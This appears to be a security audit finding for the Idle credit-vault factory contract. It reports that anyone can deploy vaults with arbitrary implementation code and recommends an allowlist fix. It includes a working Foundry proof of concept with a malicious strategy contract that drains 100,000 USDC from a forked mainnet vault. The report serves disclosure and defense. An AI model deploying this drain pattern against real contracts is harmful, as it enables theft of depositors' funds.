### Title
Unrestricted credit-vault factory deployments allow arbitrary implementation code to steal deposits - (File: `contracts/IdleCreditVaultFactory.sol`)

### Summary
`IdleCreditVaultFactory.deployCreditVault` and `deployRevolvingCreditVault` are externally callable without deployer authentication and accept caller-supplied implementation addresses for the strategy, CDO, programmable borrower, queue, and write-off escrow. [1](#0-0) [2](#0-1) [3](#0-2)  Each supplied implementation is installed behind a `TransparentUpgradeableProxy` and immediately receives the factory-constructed initializer call, so arbitrary implementation code executes in the new proxy's context. [4](#0-3) [5](#0-4)  The resulting vault can advertise the factory deployment and treasury ownership while its strategy implementation contains hidden asset-draining behavior. [6](#0-5) 

### Finding Description
The deployment functions derive the strategy proxy from `strategyData.implementation`, the CDO proxy from `cvParams.implementation`, the programmable-borrower proxy from `programmableBorrowerParams.implementation`, and ancillary proxies from `ancillaryParams`, with no code-hash, registry, or caller authorization check. [7](#0-6) [2](#0-1)  `_deployProxy` blindly forwards those addresses and initializer calldata to `TransparentUpgradeableProxy`, which delegate-calls the supplied initializer during construction. [5](#0-4) 

An attacker can provide a malicious strategy implementation that implements the selectors expected by `IdleCDOCreditVault.initialize`, such as `strategyToken()` and `symbol()`, while also exposing a hidden sweep or making `deposit()` redirect funds. [8](#0-7)  The legitimate CDO then grants unlimited underlying-token and strategy-token allowances to that malicious strategy proxy. [9](#0-8)  Once a victim deposits through `depositAA`, the malicious strategy can transfer the CDO's entire underlying balance to the attacker using that allowance. [10](#0-9) 

This is the closest analog to the reported validator-bypass RCE: user-controlled executable code is accepted where a bounded implementation was expected, and the fixed initializer selector does not constrain what the supplied implementation executes.

### Impact Explanation
An unprivileged EOA can create a factory-emitted vault whose strategy proxy contains arbitrary code without acting as its manager, borrower, owner, guardian, or feeReceiver. After depositors fund that vault, the malicious implementation can drain every underlying token held by the CDO because the CDO gave the strategy an unlimited allowance during initialization. [9](#0-8)  A single 100,000 USDC deposit therefore results in a 100,000 USDC theft and leaves the tranche holders with receipts backed by no recoverable underlying. Existing correctly deployed vaults are not directly affected, but any vault created through this path can be fully insolvent immediately after deposits.

### Likelihood Explanation
The exploit requires only one external factory call by an attacker and one victim deposit into the resulting vault. Factory deployment emits `CreditVaultDeployed`, transfers nominal ownership to `treasury`, and wires the contracts in the same manner as a legitimate deployment, making a malicious implementation difficult to distinguish without independently auditing the implementation code. [11](#0-10)  No privileged protocol participant, malicious borrower, borrower default, oracle manipulation, or off-chain prerequisite is needed.

### Recommendation
Do not accept implementation addresses from unrestricted callers. Restrict `deployCreditVault` and `deployRevolvingCreditVault` to a trusted deployer, or replace the implementation parameters with factory-approved implementation addresses stored by `treasury`. At minimum, compare each supplied implementation's `extcodehash` against an allowlist before constructing its proxy and revert on mismatch. The fix should cover `strategyData.implementation`, `cvParams.implementation`, `programmableBorrowerParams.implementation`, `queueImplementation`, and `writeOffImplementation`, because all are supplied to `_deployProxy`. [7](#0-6) [5](#0-4) 

### Proof of Concept
The following Foundry test deploys a malicious strategy through the real factory, uses honest manager and borrower addresses, deposits USDC into the resulting legitimate CDO, and drains the CDO through the unlimited strategy allowance.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";
import "../contracts/IdleCreditVaultFactory.sol";
import "../contracts/IdleCDOEpochVariant.sol";

interface IERC20Like {
    function decimals() external view returns (uint8);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount)
        external returns (bool);
}

contract EvilStrategy {
    address public immutable beneficiary;
    address public token;
    uint256 public oneToken;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    address public reportedOwner;

    constructor() {
        beneficiary = msg.sender;
    }

    function initialize(
        address _token,
        address _owner,
        address,
        address,
        string calldata,
        uint256
    ) external {
        token = _token;
        oneToken = 10 ** IERC20Like(_token).decimals();
        reportedOwner = _owner;
    }

    function strategyToken() external view returns (address) {
        return address(this);
    }

    function symbol() external pure returns (string memory) {
        return "EVIL";
    }

    function decimals() external pure returns (uint8) {
        return 6;
    }

    function approve(address, uint256) external pure returns (bool) {
        return true;
    }

    function price() external view returns (uint256) {
        return oneToken;
    }

    function getApr() external pure returns (uint256) {
        return 0;
    }

    function setAprs(uint256, uint256) external {}

    function setWhitelistedCDO(address) external {}

    function transferOwnership(address newOwner) external {
        reportedOwner = newOwner;
    }

    function owner() external view returns (address) {
        return reportedOwner;
    }

    function deposit(uint256 amount) external returns (uint256) {
        uint256 cdoBalance = IERC20Like(token).balanceOf(msg.sender);
        if (cdoBalance != 0) {
            IERC20Like(token).transferFrom(msg.sender, beneficiary, cdoBalance);
        }
        balanceOf[msg.sender] += amount;
        totalSupply += amount;
        return amount;
    }

    function sweep(address cdo) external {
        uint256 cdoBalance = IERC20Like(token).balanceOf(cdo);
        if (cdoBalance != 0) {
            IERC20Like(token).transferFrom(cdo, beneficiary, cdoBalance);
        }
        uint256 ownBalance = IERC20Like(token).balanceOf(address(this));
        if (ownBalance != 0) {
            IERC20Like(token).transfer(beneficiary, ownBalance);
        }
    }
}

contract FactoryArbitraryImplementationTest is Test {
    bytes32 internal constant DEPLOYED =
        keccak256("CreditVaultDeployed(address,address,address,address,address,address)");

    function testFactoryAcceptsMaliciousStrategyAndDrainsDeposit() external {
        vm.createSelectFork("mainnet", 21_000_000);

        address usdc = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
        address treasury = makeAddr("treasury");
        address proxyAdmin = makeAddr("proxyAdmin");
        address attacker = makeAddr("attacker");
        address victim = makeAddr("victim");
        address honestManager = makeAddr("honestManager");
        address honestBorrower = makeAddr("honestBorrower");
        address honestFeeReceiver = makeAddr("honestFeeReceiver");

        IdleCreditVaultFactory factoryImplementation = new IdleCreditVaultFactory();
        IdleCreditVaultFactory factory = IdleCreditVaultFactory(
            address(new TransparentUpgradeableProxy(
                address(factoryImplementation),
                proxyAdmin,
                abi.encodeWithSelector(
                    IdleCreditVaultFactory.initialize.selector,
                    treasury,
                    proxyAdmin
                )
            ))
        );

        IdleCDOEpochVariant cdoImplementation = new IdleCDOEpochVariant();

        vm.prank(attacker);
        EvilStrategy evilImplementation = new EvilStrategy();

        IdleCreditVaultFactory.CreditVaultParams memory cvParams =
            IdleCreditVaultFactory.CreditVaultParams({
                implementation: address(cdoImplementation),
                limit: 0,
                underlying: usdc,
                apr: 10e18,
                epochDuration: 7 days,
                bufferPeriod: 1 days,
                instantWithdrawDelay: 1 hours,
                instantWithdrawAprDelta: 1e18,
                disableInstantWithdraw: true,
                keyringPolicy: 0,
                feeReceiver: honestFeeReceiver,
                fees: 5_000,
                managementFee: 0,
                isInterestMinted: false,
                isDepositDuringEpochDisabled: false
            });

        IdleCreditVaultFactory.StrategyData memory strategyData =
            IdleCreditVaultFactory.StrategyData({
                implementation: address(evilImplementation),
                manager: honestManager,
                borrower: honestBorrower,
                borrowerName: "Honest Borrower"
            });

        IdleCreditVaultFactory.AncillaryParams memory ancillary =
            IdleCreditVaultFactory.AncillaryParams({
                keyring: address(0),
                queueImplementation: address(0),
                prefundedDepositWindow: 0,
                writeOffImplementation: address(0)
            });

        vm.recordLogs();
        vm.prank(attacker);
        factory.deployCreditVault(cvParams, strategyData, ancillary);

        address cv;
        address strategy;
        Vm.Log[] memory logs = vm.getRecordedLogs();
        for (uint256 i; i < logs.length; ++i) {
            if (logs[i].topics.length != 0 && logs[i].topics[0] == DEPLOYED) {
                (cv, strategy,,,,) = abi.decode(
                    logs[i].data,
                    (address, address, address, address, address, address)
                );
            }
        }
        assertTrue(cv != address(0));
        assertTrue(strategy != address(0));

        uint256 depositAmount = 100_000e6;
        deal(usdc, victim, depositAmount);

        vm.startPrank(victim);
        IERC20Like(usdc).approve(cv, depositAmount);
        IdleCDOEpochVariant(cv).depositAA(depositAmount);
        vm.stopPrank();

        EvilStrategy(strategy).sweep(cv);

        assertEq(IERC20Like(usdc).balanceOf(attacker), depositAmount);
        assertEq(IERC20Like(usdc).balanceOf(cv), 0);
        assertEq(IERC20Like(usdc).balanceOf(strategy), 0);
    }
}
```
